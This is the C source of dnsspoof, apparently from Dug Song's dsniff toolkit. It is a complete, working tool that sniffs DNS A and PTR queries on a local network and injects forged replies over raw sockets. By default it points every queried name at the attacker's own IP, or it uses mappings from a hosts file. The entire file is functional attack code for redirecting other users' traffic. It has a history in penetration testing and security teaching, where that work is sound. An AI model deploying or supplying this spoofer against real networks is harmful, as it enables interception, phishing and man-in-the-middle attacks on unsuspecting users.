/*
 * dnsspoof.c
 *
 * Forge replies to arbitrary DNS A / PTR queries on the LAN.
 *
 * Copyright (c) 2000 Dug Song <dugsong@monkey.org>
 *
 * $Id: dnsspoof.c,v 1.10 2001/03/15 08:33:03 dugsong Exp $
 */

#include "config.h"

#include <sys/param.h>
#include <sys/types.h>
#include <sys/queue.h>
#include <netinet/in.h>
#include <arpa/nameser.h>

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <resolv.h>
#include <err.h>
#include <libnet.h>
#include <pcap.h>

#include "pcaputil.h"
#include "version.h"

struct dnsent {
	char		*name;
	in_addr_t	 ip;
	SLIST_ENTRY(dnsent) next;
};

SLIST_HEAD(, dnsent) dns_entries;

pcap_t		*pcap_pd = NULL;
int		 pcap_off = -1;
int		 lnet_sock = -1;
u_long		 lnet_ip = -1;

static void
usage(void)
{
	fprintf(stderr, "Version: " VERSION "\n"
		"Usage: dnsspoof [-i interface] [-f hostsfile] [expression]\n");
	exit(1);
}

/* Pattern matching code from OpenSSH. */
static int
match_pattern(const char *s, const char *pattern)
{
	for (;;) {
		if (!*pattern) return (!*s);
		
		if (*pattern == '*') {
			pattern++;
			
			if (!*pattern) return (1);
			
			if (*pattern != '?' && *pattern != '*') {
				for (; *s; s++) {
					if (*s == *pattern &&
					    match_pattern(s + 1, pattern + 1))
						return (1);
				}
				return (0);
			}
			for (; *s; s++) {
				if (match_pattern(s, pattern))
					return (1);
			}
			return (0);
		}
		if (!*s) return (0);
		
		if (*pattern != '?' && *pattern != *s)
			return (0);
		
		s++;
		pattern++;
	}
	/* NOTREACHED */
}

static void
dns_init(char *dev, char *filename)
{
	FILE *f;
	struct libnet_link_int *llif;
	struct dnsent *de;
	char *ip, *name, buf[1024];

	if ((llif = libnet_open_link_interface(dev, buf)) == NULL)
		errx(1, "%s", buf);
	
	if ((lnet_ip = libnet_get_ipaddr(llif, dev, buf)) == -1)
		errx(1, "%s", buf);

	lnet_ip = htonl(lnet_ip);
	
	libnet_close_link_interface(llif);

	SLIST_INIT(&dns_entries);
	
	if (filename != NULL) {
		if ((f = fopen(filename, "r")) == NULL)
			err(1, "fopen");
		
		while (fgets(buf, sizeof(buf), f) != NULL) {
			if (buf[0] == '#' || buf[0] == '\n')
				continue;
			
			if ((ip = strtok(buf, "\t ")) == NULL ||
			    (name = strtok(NULL, "\n\t ")) == NULL)
				continue;
			
			if ((de = malloc(sizeof(*de))) == NULL)
				err(1, "malloc");
			
			if ((de->ip = inet_addr(ip)) == INADDR_ANY ||
			    (de->name = strdup(name)) == NULL)
				errx(1, "invalid entry");
			
			SLIST_INSERT_HEAD (&dns_entries, de, next);
		}
		fclose(f);
	}
	else {
		if ((de = malloc(sizeof(*de))) == NULL)
			err(1, "malloc");
		
		de->ip = lnet_ip;
		de->name = "*";
		
		SLIST_INSERT_HEAD (&dns_entries, de, next);
	}
}

static in_addr_t
dns_lookup_a(const char *name)
{
	struct dnsent *de;
	
	SLIST_FOREACH(de, &dns_entries, next) {
		if (match_pattern(name, de->name))
			return (de->ip);
	}
	return (-1);
}

static char *
dns_lookup_ptr(const char *name)
{
	struct dnsent *de;
	int a0, a1, a2, a3;
	in_addr_t dst;
	char *a;

	if (strchr(name, '%') != NULL)
		return (NULL);

	if (sscanf(name, "%d.%d.%d.%d.", &a3, &a2, &a1, &a0) != 4)
		return (NULL);

	a = (char *)&dst;

	a[0] = a0 & 0xff; a[1] = a1 & 0xff; a[2] = a2 & 0xff; a[3] = a3 & 0xff;
	
	SLIST_FOREACH(de, &dns_entries, next) {
		if (de->ip == dst && strchr(de->name, '*') == NULL)
			return (de->name);
	}
	return (NULL);
}

static void
dns_spoof(u_char *u, const struct pcap_pkthdr *pkthdr, const u_char *pkt)
{
	struct libnet_ip_hdr *ip;
	struct libnet_udp_hdr *udp;
	HEADER *dns;
	char name[MAXHOSTNAMELEN];
	u_char *p, *q, *end, buf[1024];
	int i, anslen, dnslen;
	in_addr_t dst;
	u_short type, class;

	ip = (struct libnet_ip_hdr *)(pkt + pcap_off);
	udp = (struct libnet_udp_hdr *)(pkt + pcap_off + (ip->ip_hl * 4));
	dns = (HEADER *)(udp + 1);
	p = (u_char *)(dns + 1);
	end = (u_char *)pkt + pkthdr->caplen;

	if ((dnslen = end - (u_char *)dns) < sizeof(*dns))
		return;

	if (dns->opcode != QUERY || ntohs(dns->qdcount) != 1 ||
	    dns->ancount || dns->nscount || dns->arcount)
		return;

	if ((i = dn_expand((u_char *)dns, end, p, name, sizeof(name))) < 0)
		return;

	p += i;
	GETSHORT(type, p);
	GETSHORT(class, p);

	if (class != C_IN)
		return;

	p = buf + IP_H + UDP_H + dnslen;
	
	if (type == T_A) {
		if ((dst = dns_lookup_a(name)) == -1)
			return;
		/* XXX - cheat on alignment. */
		memcpy(p, "\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04",
		       12);
		memcpy(p + 12, &dst, sizeof(dst));
		anslen = 16;
	}
	else if (type == T_PTR) {
		if ((q = dns_lookup_ptr(name)) == NULL)
			return;
		/* XXX - cheat on alignment. */
		memcpy(p, "\xc0\x0c\x00\x0c\x00\x01\x00\x00\x00\x3c", 10);
		anslen = dn_comp(q, p + 12, 256, NULL, NULL);
		p += 10;
		PUTSHORT(anslen, p);
		anslen += 12;
	}
	else return;
	
	libnet_build_ip(UDP_H + dnslen + anslen, 0, libnet_get_prand(PRu16),
			0, 64, IPPROTO_UDP, ip->ip_dst.s_addr,
			ip->ip_src.s_addr, NULL, 0, buf);
	
	libnet_build_udp(ntohs(udp->uh_dport), ntohs(udp->uh_sport),
			 NULL, dnslen + anslen, buf + IP_H);

	memcpy(buf + IP_H + UDP_H, (u_char *)dns, dnslen);

	dns = (HEADER *)(buf + IP_H + UDP_H);
	dns->qr = dns->ra = 1;
	if (type == T_PTR) dns->aa = 1;
	dns->ancount = htons(1);

	dnslen += anslen;
	
	libnet_do_checksum(buf, IPPROTO_UDP, UDP_H + dnslen);
	
	if (libnet_write_ip(lnet_sock, buf, IP_H + UDP_H + dnslen) < 0)
		warn("write");

	fprintf(stderr, "%s.%d > %s.%d:  %d+ %s? %s\n",
	      libnet_host_lookup(ip->ip_src.s_addr, 0), ntohs(udp->uh_sport),
	      libnet_host_lookup(ip->ip_dst.s_addr, 0), ntohs(udp->uh_dport),
	      ntohs(dns->id), type == T_A ? "A" : "PTR", name);
}

static void
cleanup(int sig)
{
	libnet_close_raw_sock(lnet_sock);
	pcap_close(pcap_pd);
	exit(0);
}

int
main(int argc, char *argv[])
{
	extern char *optarg;
	extern int optind;
	char *p, *dev, *hosts, buf[1024];
	int i;

	dev = hosts = NULL;
	
	while ((i = getopt(argc, argv, "i:f:h?")) != -1) {
		switch (i) {
		case 'i':
			dev = optarg;
			break;
		case 'f':
			hosts = optarg;
			break;
		default:
			usage();
			break;
		}
	}
	argc -= optind;
	argv += optind;

	if (dev == NULL && (dev = pcap_lookupdev(buf)) == NULL)
		errx(1, "%s", buf);
	
	dns_init(dev, hosts);
	
	if (argc > 0) {
		p = copy_argv(argv);
		strlcpy(buf, p, sizeof(buf));
	}
	else snprintf(buf, sizeof(buf), "udp dst port 53 and not src %s",
		      libnet_host_lookup(lnet_ip, 0));
	
	if ((pcap_pd = pcap_init(dev, buf, 128)) == NULL)
		errx(1, "couldn't initialize sniffing");

	if ((pcap_off = pcap_dloff(pcap_pd)) < 0)
		errx(1, "couldn't determine link layer offset");
	
	if ((lnet_sock = libnet_open_raw_sock(IPPROTO_RAW)) == -1)
		errx(1, "couldn't initialize sending");
	
	libnet_seed_prand();
	
	signal(SIGHUP, cleanup);
	signal(SIGINT, cleanup);
	signal(SIGTERM, cleanup);

	warnx("listening on %s [%s]", dev, buf);
	
	pcap_loop(pcap_pd, -1, dns_spoof, NULL);
	
	/* NOTREACHED */
	
	exit(0);
}
